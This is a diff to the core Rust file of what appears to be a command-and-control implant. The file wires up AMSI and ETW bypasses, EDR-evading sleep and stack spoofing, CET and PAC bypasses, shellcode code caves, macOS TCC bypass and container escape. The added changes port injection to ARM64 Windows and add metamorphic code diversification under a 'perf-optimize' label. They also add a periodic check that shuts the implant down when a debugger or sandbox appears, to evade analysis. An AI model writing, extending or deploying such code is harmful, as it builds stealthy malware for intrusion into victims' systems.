@@ -82,6 +82,14 @@ pub mod stack_spoof;
 #[cfg(feature = "self-reencode")]
 pub mod self_reencode;
 
+// SIMD-accelerated performance primitives for hot-path operations
+// (secure zeroing, bulk XOR).  Gated behind `perf-optimize`, which
+// also enables the optimizer crate's full metamorphic diversification
+// pipeline (instruction substitution, dead-code insertion, NOP
+// scheduling, microarchitecture-specific dispatch).
+#[cfg(feature = "perf-optimize")]
+pub mod perf;
+
 // Memory-guard: active implementation when feature is on, zero-cost stubs when off.
 #[cfg(feature = "memory-guard")]
 pub mod memory_guard;
@@ -112,7 +120,7 @@ pub mod sleep_obfuscation;
 // path (KE_TIMER → KiDeliverApc) that is less commonly hooked by EDR.
 // Uses NtQueryPerformanceCounter for hardware timestamps and can target a
 // clean-mapped DLL gadget for the APC callback address.
-#[cfg(all(windows, target_arch = "x86_64"))]
+#[cfg(windows)]
 pub mod hw_timer_sleep;
 
 // Memory Encryption with Thread Context: encrypts thread register states
@@ -140,6 +148,12 @@ pub mod trampoline_spoof;
 // Windows-only, gated by the `evanesco` feature flag.
 #[cfg(all(windows, feature = "evanesco"))]
 pub mod page_tracker;
+
+// Runtime page-size resolution for injection modules.
+// ARM64 Windows may use 4 KB or 16 KB pages; this queries GetSystemInfo
+// once and caches the result so no injection module hard-codes 0x1000.
+#[cfg(windows)]
+pub mod page_size;
 
 // Continuous memory hygiene: PEB scrubbing, thread start address sanitization,
 // handle table cleanup, and periodic re-verification.  Works alongside the
@@ -455,6 +469,13 @@ pub mod lpe;
 #[cfg(all(target_os = "linux", feature = "container-escape"))]
 pub mod container;
 
+// Shared macOS FFI types and CoreGraphics / CoreFoundation bindings.
+// Centralises CGPoint, CGSize, CGRect, CFTypeRef, and common extern
+// blocks used by remote_assist, macos_postexp, and env_check_sandbox.
+// Gated to macOS only — no content on other platforms.
+#[cfg(target_os = "macos")]
+pub mod macos_ffi;
+
 // macOS post-exploitation: TCC bypass (database manipulation, synthetic
 // click via CoreGraphics, vulnerable process delegation), SIP status
 // assessment (csrutil, NVRAM, capability enumeration), XPC service
@@ -709,7 +730,7 @@ pub mod pe_resolve_macros;
 
 use anyhow::Result;
 use common::{CryptoSession, LockedSecret, Message, Transport};
-use log::{error, info, warn};
+use tracing::{error, info, warn};
 use std::sync::Arc;
 use tokio::sync::{Mutex, RwLock};
 
@@ -821,7 +842,7 @@ impl Agent {
             ));
 
             #[cfg(any(debug_assertions, feature = "dev", test))]
-            log::warn!(
+            tracing::warn!(
                 "WARNING: module_aes_key not set — using insecure all-zero key. \
                  Do not use in production!"
             );
@@ -867,10 +888,10 @@ impl Agent {
             };
 
             if decision.report.ld_preload_set {
-                log::warn!("LD_PRELOAD is set in the environment (soft warning)");
+                tracing::warn!("LD_PRELOAD is set in the environment (soft warning)");
             }
             if decision.report.timing_anomaly_detected {
-                log::warn!("Timing anomaly detected (soft warning, possibly high load)");
+                tracing::warn!("Timing anomaly detected (soft warning, possibly high load)");
             }
 
             if decision.refuse {
@@ -945,7 +966,7 @@ impl Agent {
                 evanesco_cfg.idle_threshold_ms,
                 evanesco_cfg.scan_interval_ms,
             ) {
-                log::warn!("evanesco: init failed (non-fatal): {e:#}");
+                tracing::warn!("evanesco: init failed (non-fatal): {e:#}");
             }
         }
 
@@ -958,7 +979,7 @@ impl Agent {
         {
             let cfg = self.config.read().await;
             crate::syscall_emulation::init_from_config(&cfg.syscall_emulation);
-            log::info!(
+            tracing::info!(
                 "syscall_emulation: initialised (enabled={}, prefer_kernel32={}, emulated={:?})",
                 cfg.syscall_emulation.enabled,
                 cfg.syscall_emulation.prefer_kernel32,
@@ -974,7 +995,7 @@ impl Agent {
         {
             let cfg = self.config.read().await;
             crate::cet_bypass::init_from_config(&cfg.cet_bypass);
-            log::info!(
+            tracing::info!(
                 "cet_bypass: initialised (enabled={}, state={})",
                 cfg.cet_bypass.enabled,
                 crate::cet_bypass::cet_state(),
@@ -991,7 +1012,7 @@ impl Agent {
         {
             let cfg = self.config.read().await;
             crate::bti_pac_bypass::init_from_config(&cfg.bti_pac);
-            log::info!(
+            tracing::info!(
                 "bti_pac_bypass: initialised (enabled={}, state={})",
                 cfg.bti_pac.enabled,
                 crate::bti_pac_bypass::pac_state_str(),
@@ -1107,7 +1128,7 @@ impl Agent {
 
         #[cfg(feature = "stealth")]
         {
-            log::debug!("Applying evasion layers");
+            tracing::debug!("Applying evasion layers");
             // AMSI bypass: choose one strategy, never combine (H-11).
             // The memory patch overwrites the bytes that HWBP set breakpoints on,
             // so running both makes the HWBP path silently no-op.
@@ -1131,7 +1152,7 @@ impl Agent {
             {
                 let hwbp_ok = unsafe { crate::hw_bp_hook::install_amsi_bypass() };
                 if !hwbp_ok {
-                    log::warn!("hw-bp-hook AMSI bypass failed; falling back to memory patch");
+                    tracing::warn!("hw-bp-hook AMSI bypass failed; falling back to memory patch");
                     crate::amsi_defense::orchestrate_layers();
                 }
             }
@@ -1141,7 +1162,7 @@ impl Agent {
             }
             crate::amsi_defense::verify_bypass();
             crate::evasion::hide_current_thread();
-            log::debug!("Evasion layers applied");
+            tracing::debug!("Evasion layers applied");
         }
 
         // Startup transport selection is feature-gated and profile-driven.
@@ -1191,7 +1212,7 @@ impl Agent {
                 .filter(|s| !s.is_empty())
                 .is_some()
             {
-                log::warn!(
+                tracing::warn!(
                     "ssh_host is configured in the malleable profile but the `ssh-transport` \
                      feature is not compiled in. SSH branch is skipped."
                 );
@@ -1199,7 +1220,7 @@ impl Agent {
 
             #[cfg(not(feature = "doh-transport"))]
             if profile.dns_over_https {
-                log::warn!(
+                tracing::warn!(
                     "dns_over_https=true in config but the `doh-transport` feature is not \
                      compiled in. DoH branch is skipped in startup transport selection. \
                      Rebuild with --features doh-transport to enable DohTransport. \
@@ -1209,7 +1230,7 @@ impl Agent {
             }
             #[cfg(not(feature = "http-transport"))]
             if profile.cdn_relay {
-                log::warn!(
+                tracing::warn!(
                     "cdn_relay=true in config but the `http-transport` feature is not \
                      compiled in. HTTP branch is skipped in startup transport selection. \
                      Rebuild with --features http-transport to enable HttpTransport."
@@ -1229,6 +1250,26 @@ impl Agent {
         #[cfg(feature = "unsafe-runtime-rewrite")]
         if let Err(e) = optimizer::optimize_hot_function("crypto_session_encrypt") {
             tracing::warn!("Runtime optimization failed: {}", e);
+        }
+
+        // When perf-optimize is enabled, additionally optimise the crypto
+        // decrypt path and report the detected SIMD microarchitecture level.
+        #[cfg(all(feature = "perf-optimize", feature = "unsafe-runtime-rewrite"))]
+        {
+            if let Err(e) = optimizer::optimize_hot_function("crypto_session_decrypt") {
+                tracing::warn!("Runtime optimization (decrypt) failed: {}", e);
+            }
+            tracing::info!(
+                arch_level = crate::perf::detected_arch_level(),
+                "perf-optimize: SIMD microarchitecture detected"
+            );
+        }
+        #[cfg(all(feature = "perf-optimize", not(feature = "unsafe-runtime-rewrite")))]
+        {
+            tracing::info!(
+                arch_level = crate::perf::detected_arch_level(),
+                "perf-optimize: SIMD microarchitecture detected (runtime rewrite disabled, build-time diversification active)"
+            );
         }
 
         // Honour opt-in persistence (Prompt H).
@@ -1313,6 +1354,23 @@ impl Agent {
         // Iteration counter for periodic tasks (syscall cache validation, etc.).
         let mut loop_iteration: u32 = 0;
 
+        // Periodic environment re-check state.  Sandboxes can delay attaching
+        // analysis tools until after the startup validation passes.  Re-running
+        // the check every few hours catches tools that were absent at startup
+        // but appeared later (e.g., a debugger attached after the initial
+        // checkin, or a sandbox that delayed injecting its monitoring DLL).
+        let env_recheck_interval = std::time::Duration::from_secs(3 * 3600); // 3 hours
+        let mut last_env_recheck = std::time::Instant::now();
+        // Track the initial VM state so the re-check only triggers when the
+        // environment *changes* from non-hostile to hostile.  This avoids
+        // false positives from the re-check on VMs that were already accepted
+        // at startup with full knowledge.
+        #[cfg(feature = "env-validation")]
+        let initial_vm_ok = {
+            let cfg = self.config.read().await;
+            !(cfg.refuse_in_vm || cfg.refuse_when_debugged || cfg.sandbox_score_threshold.is_some())
+        };
+
         loop {
             loop_iteration += 1;
 
@@ -1325,11 +1383,71 @@ impl Agent {
                 if interval > 0 && loop_iteration % interval == 0 {
                     match crate::syscalls::validate_cache() {
                         Ok(n) => {
-                            log::debug!("Periodic syscall cache validation: {} entries OK", n);
+                            tracing::debug!("Periodic syscall cache validation: {} entries OK", n);
                         }
                         Err(e) => {
-                            log::warn!("Periodic syscall cache validation failed: {e}; cache invalidated, will re-map on next syscall");
+                            tracing::warn!("Periodic syscall cache validation failed: {e}; cache invalidated, will re-map on next syscall");
                         }
+                    }
+                }
+            }
+
+            // Periodic environment re-check.  Only runs when env-validation is
+            // enabled and the initial startup check passed (otherwise the agent
+            // is already in the dormant retry loop).  When the environment
+            // transitions from benign to hostile mid-execution, the agent
+            // gracefully shuts down instead of continuing to operate under
+            // observation.
+            #[cfg(feature = "env-validation")]
+            {
+                let elapsed = last_env_recheck.elapsed();
+                if elapsed >= env_recheck_interval && !initial_vm_ok {
+                    last_env_recheck = std::time::Instant::now();
+                    let cfg = self.config.read().await;
+                    let recheck = env_check::enforce(
+                        cfg.required_domain.as_deref(),
+                        cfg.refuse_when_debugged,
+                        cfg.refuse_in_vm,
+                        cfg.sandbox_score_threshold,
+                    );
+                    if recheck.refuse {
+                        tracing::warn!(
+                            "env_check: periodic re-check FAILED after {} h — \
+                             environment became hostile (debugger={}, vm={}, domain={:?}); \
+                             initiating graceful shutdown to prevent analysis",
+                            elapsed.as_secs() / 3600,
+                            recheck.report.debugger_present,
+                            recheck.report.vm_detected,
+                            recheck.report.domain_match,
+                        );
+                        // Send audit log about the re-check failure before exiting.
+                        let audit_ts = std::time::SystemTime::now()
+                            .duration_since(std::time::UNIX_EPOCH)
+                            .unwrap_or(std::time::Duration::from_secs(0))
+                            .as_secs();
+                        let _ = outbound_tx.send(Message::AuditLog(
+                            common::AuditEvent {
+                                timestamp: audit_ts,
+                                agent_id: String::new(), // filled by transport layer
+                                user: "system".to_string(),
+                                action: "env_recheck_failed".to_string(),
+                                details: format!(
+                                    "Periodic env re-check failed after {}h: debugger={}, vm={}, sandbox_score={}",
+                                    elapsed.as_secs() / 3600,
+                                    recheck.report.debugger_present,
+                                    recheck.report.vm_detected,
+                                    recheck.report.sandbox_score,
+                                ),
+                                outcome: common::Outcome::Failure,
+                                tampered: false,
+                            },
+                        )).await;
+                        break;
+                    } else {
+                        tracing::debug!(
+                            "env_check: periodic re-check passed ({} h elapsed)",
+                            elapsed.as_secs() / 3600,
+                        );
                     }
                 }
             }
@@ -1516,7 +1634,7 @@ impl Agent {
                         let mut mesh = mesh_arc.lock().await;
                         match p2p::forward_to_child(&mut mesh, child_link_id, &data).await {
                             Ok(()) => {
-                                log::debug!(
+                                tracing::debug!(
                                     "P2P data forwarded to child {:#010X} ({} bytes)",
                                     child_link_id,
                                     data.len()
@@ -1608,8 +1726,9 @@ pub mod callback_exec;
 // Code cave allocator: finds padding bytes in `.text` sections of loaded DLLs
 // for placing shellcode without new executable allocations. Used by
 // callback-based injection (injection::callback_exec) and other techniques
-// that require stealthy code placement. Windows x86_64 only.
-#[cfg(all(windows, target_arch = "x86_64"))]
+// that require stealthy code placement. Works on both x86_64 and aarch64
+// Windows targets.
+#[cfg(windows)]
 pub mod code_cave;
 pub mod etw_patch;
 pub mod evasion;
